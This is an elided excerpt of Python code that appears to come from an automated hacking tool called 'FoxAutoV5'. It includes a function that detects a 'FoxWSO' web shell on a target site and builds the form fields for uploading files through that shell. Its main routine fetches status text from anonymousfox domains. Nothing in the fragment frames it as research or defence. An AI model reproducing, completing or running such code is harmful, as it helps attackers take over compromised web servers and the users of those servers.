...
def uploadFile_ALL(urlShell) :
	try :
		...
		if ('- FoxWSO v' in src):
			...
			filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': '', 'path': './'}
...
def main():
	try :
		log()
		try :
			main = requests.get('https://anonymousfox.is/_@info/FoxAutoV5_news2.txt', headers=headers, timeout=15)
		except:
			main = requests.get('https://anonymousfox.io/_@info/FoxAutoV5_news2.txt', headers=headers, timeout=15)
